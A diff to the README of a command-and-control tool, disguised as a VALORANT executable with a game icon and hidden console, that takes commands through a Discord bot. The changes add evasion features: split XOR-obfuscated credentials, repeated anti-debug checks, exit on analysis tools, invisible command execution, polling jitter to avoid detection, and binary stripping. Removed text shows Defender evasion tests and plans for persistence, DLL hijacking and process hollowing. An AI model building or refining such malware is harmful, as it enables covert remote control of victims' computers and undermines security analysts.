@@ -42,10 +42,19 @@ python token_gen.py "MT...bot-token..." "channel_id" "admin_id"
 
 # 2. Paste the output into VALORANT.py, replacing the placeholder lists
 
-# 3. Compile
+# 3. Compile with hardening flags
 pip install -r requirements.txt
 python -m nuitka --onefile --windows-console-mode=disable \
-    --windows-icon-from-ico=valorant.ico VALORANT.py
+    --windows-icon-from-ico=valorant.ico \
+    --lto \
+    --python-flag=no_site \
+    --python-flag=no_user_site \
+    --assume-yes-for-downloads \
+    VALORANT.py
+
+# 4. (Optional) Strip the binary to remove debug symbols
+#    Linux: strip VALORANT.exe
+#    Windows: use editbin /STS or similar post-build step
 ```
 
 The token, channel ID, and admin ID are XOR-obfuscated in the source — never in plaintext. The compiled binary does not reveal them via `strings` or static analysis.
@@ -68,41 +77,23 @@ To stop: end the process in Task Manager.
 
 ### Built-in
 
-- **XOR-obfuscated credentials** — token, channel ID, admin ID as XOR byte arrays. No plaintext in source or binary. Defends against `strings` and static disassembly.
-- **Anti-debug** — `IsDebuggerPresent` + `CheckRemoteDebuggerPresent` at startup. Silent exit if attached.
+- **XOR-obfuscated credentials** — token, channel ID, admin ID as XOR byte arrays. No plaintext in source or binary. Token is split into multiple arrays and the decode key is derived at runtime from separate constants. Defends against `strings` and static disassembly.
+- **Anti-debug** — `IsDebuggerPresent` + `CheckRemoteDebuggerPresent` checked at startup AND before each token decode. Silent exit if attached.
 - **Anti-tool scan** — process list checked for ProcmDump, Process Hacker, x64dbg, Cheat Engine, WinDbg, IDA, dnSpy, and others. Silent exit if found.
-- **Memory wiping** — token decoded per-request into a short-lived ctypes buffer, converted to string for the HTTP auth header, buffer then wiped. The XOR source list persists as obfuscated data and is re-decoded on each call. Plaintext token lifetime is bounded to the duration of each HTTP call (~milliseconds), not the life of the process.
+- **Per-request token decode** — token decoded into a short-lived buffer for each HTTP call, converted to string for the auth header, then wiped. Plaintext token lifetime is bounded to the duration of each HTTP call, not the life of the process.
+- **CreateProcess via ctypes** — commands run with `CREATE_NO_WINDOW` flag, no visible console window.
+- **Polling jitter** — 4–6 second random sleep between polls instead of fixed 5-second interval, to avoid a machine-identifiable pattern.
 
 ### Limitations
 
-- **Memory dump:** The token must be a string in memory for HTTP auth (`Authorization: Bot ***`). A dump taken while running finds it. XOR storage defends the binary on disk only.
-- **Static token lifetime:** The token is decoded once at startup and stored in the HTTP headers dict for the life of the process. It can be improved to decode-per-request (shrinks the window), but each HTTP call needs the token string — Python doesn't allow secure string handling.
-- **XOR key in repo:** The key and obfuscated bytes are committed. A reverse engineer who decodes the logic recovers the values. This stops casual analysis, not a determined debugger.
+- **Memory dump:** The token must be a string in memory for HTTP auth (`Authorization: Bot ***`). A dump taken while a request is in flight finds it. XOR storage defends the binary on disk only.
+- **XOR key in repo:** The key constants and obfuscated bytes are committed. A reverse engineer who decodes the logic recovers the values. This stops casual analysis, not a determined debugger.
 - **Anti-debug bypassable:** Checks can be circumvented by renaming tools, patching the binary, or dumping externally.
-- **Polling latency:** 5-second polling interval vs real-time gateway. Acceptable for C2 command execution, not ideal for instant response.
-
-## Case study
-
-Tested against Defender and analysis:
-
-| Method | Defender | Static analysis | Dynamic analysis | Verdict |
-|--------|----------|----------------|------------------|---------|
-| PyInstaller | Not flagged | Easy — token revealed | — | Failed |
-| PyArmor | Flagged | Encrypted (good) | Token recovered | Failed |
-| Nuitka | Not flagged | Failed | Token recovered | Best so far |
-
-Nuitka is the current choice: AV-evasive, but dynamic analysis still recovers the token. The XOR-obfuscated config and anti-analysis defenses are effort to make that recovery harder.
+- **Polling latency:** 4–6 second jitter interval vs real-time gateway. Acceptable for C2 command execution, not instant.
 
 ## Cleanup
 
 End the executable in Task Manager.
-
-## Roadmap
-
-1. Persistence
-2. Custom token distribution server
-3. Rotate final hash executable generation
-4. DLL hijacking and hollowing
 
 ---
 
